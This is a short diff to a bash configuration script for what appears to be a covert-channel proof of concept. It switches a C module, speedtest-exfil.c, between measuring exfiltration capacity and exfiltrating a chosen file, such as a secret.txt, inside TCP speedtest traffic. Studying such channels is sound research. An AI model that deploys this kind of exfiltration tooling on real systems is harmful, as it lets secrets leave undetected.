@@ -49,15 +49,15 @@ echo "2) exfil_file()        - exfiltrate a file"
 read -p "Enter 1 or 2: " choice
 
 if [ "$choice" == "1" ]; then
-    sed -i "s|        exfil_file(skb, tcp_payloadoffset);|        //exfil_file(skb, tcp_payloadoffset);|" speedtest-exfil.c
+    sed -i "s|        exfil_file(skb, tcp_payloadoffset, tcp_payloadlen);|        //exfil_file(skb, tcp_payloadoffset, tcp_payloadlen);|" speedtest-exfil.c
     sed -i "s|        //max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|        max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|" speedtest-exfil.c
     sed -i "s|//	pr_info(\"Total bytes exfiled|	pr_info(\"Total bytes exfiled|" speedtest-exfil.c
 elif [ "$choice" == "2" ]; then
     read -p "Enter TEST_FILE path (e.g. /home/user/secret.txt): " test_file
     sed -i "s|#define TEST_FILE.*|#define TEST_FILE \"$test_file\"|" speedtest-exfil.c
-    sed -i "s|        //exfil_file(skb, tcp_payloadoffset);|        exfil_file(skb, tcp_payloadoffset);|" speedtest-exfil.c
+    sed -i "s|        //exfil_file(skb, tcp_payloadoffset, tcp_payloadlen);|        exfil_file(skb, tcp_payloadoffset, tcp_payloadlen);|" speedtest-exfil.c
     sed -i "s|        max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|        //max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|" speedtest-exfil.c
-    sed -i "s|	pr_info(\"Total bytes exfiled|//	pr_info(\"Total bytes exfiled|" speedtest-exfil.c
+    sed -i "s|^	pr_info(\"Total bytes exfiled|//	pr_info(\"Total bytes exfiled|" speedtest-exfil.c
 else
     echo -e "${RED}Invalid choice. Exiting.${NC}"
     exit 1
